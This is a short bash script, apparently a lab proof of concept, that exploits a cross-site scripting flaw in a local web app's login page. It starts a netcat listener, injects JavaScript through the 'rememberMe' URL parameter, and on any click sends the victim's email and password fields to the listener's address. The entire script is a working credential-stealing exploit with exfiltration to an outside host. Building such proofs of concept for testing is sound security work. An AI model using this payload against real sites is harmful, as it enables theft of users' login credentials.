#!/bin/bash
set -m

nc -lvp 4444 &

ip=`ip a | awk '/docker0/ && /inet/ {print $2}' | cut -d '/' -f 1`

./emulate.sh 'http://localhost/Identity/Login?rememberMe=window.addEventListener(`click`,function(){location%3d`http://'$ip':4444?x=${window.Data_Email.value}:${window.Data_Password.value}`})'

fg